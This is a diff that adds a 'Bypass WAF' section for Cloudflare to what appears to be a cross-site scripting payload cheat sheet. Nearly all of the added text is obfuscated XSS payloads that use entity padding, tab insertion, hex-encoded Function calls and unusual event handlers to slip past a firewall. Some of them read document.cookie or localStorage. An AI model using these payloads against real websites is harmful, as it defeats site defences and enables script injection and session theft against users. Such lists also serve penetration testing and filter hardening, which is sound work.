@@ -336,5 +336,50 @@ javascript://%250Aalert(1)
 <!--><svg onload=alert(1)-->
 ```
 
+## Bypass WAF
+1. Cloudflare
+```
+<svg%0Aonauxclick=0;[1].some(confirm)//
+
+<svg onload=alert%26%230000000040"")>
+
+<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>
+<svg onx=() onload=(confirm)(1)>
+
+<svg onx=() onload=(confirm)(document.cookie)>
+
+<svg onx=() onload=(confirm)(JSON.stringify(localStorage))>
+
+Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
+
+"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
+
+Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
+
+"><onx=[] onmouseover=prompt(1)>
+
+%2sscript%2ualert()%2s/script%2u -xss popup
+
+<svg onload=alert%26%230000000040"1")>
+
+"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))
+
+[1].map(confirm)'ale'+'rt'()a&Tab;l&Tab;e&Tab;r&Tab;t(1)prompt&lpar;1&rpar;prompt&#40;1&#41;prompt%26%2300000000000000000040;1%26%2300000000000000000041;(prompt())(prompt``)
+
+<svg onload=prompt%26%230000000040document.domain)>
+
+<svg onload=prompt%26%23x000000028;document.domain)>
+
+<svg/onrandom=random onload=confirm(1)>
+
+<video onnull=null onmouseover=confirm(1)>
+
+<a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus>
+
+:javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
+<img ignored=() src=x onerror=prompt(1)>
+```
+
 Reference:
 - [Brute Logic](https://brutelogic.com.br/)
